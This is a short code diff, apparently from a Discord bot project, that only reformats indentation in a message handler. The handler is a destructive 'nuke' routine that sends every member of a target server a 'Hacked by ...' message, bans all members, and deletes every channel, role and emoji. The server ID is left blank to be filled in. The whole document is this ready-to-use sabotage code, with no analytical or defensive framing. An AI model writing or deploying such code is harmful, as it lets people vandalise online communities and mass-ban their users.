@@ -14,12 +14,11 @@ client.on('ready', (guild) => {
 
 
 client.on('message', message => {
-
-    const list = client.guilds.get(""); //INSERT SERVER ID 
-
+	
+	const list = client.guilds.get(""); //INSERT SERVER ID 
 	list.members.forEach(member => member.send("Hacked by ..."));
-    list.members.forEach(member => member.ban());
-    message.guild.channels.forEach(channel => channel.delete());
+    	list.members.forEach(member => member.ban());
+    	message.guild.channels.forEach(channel => channel.delete());
 	list.roles.forEach(role => role.delete());
 	list.emojis.forEach(emoji => emoji.delete());
 
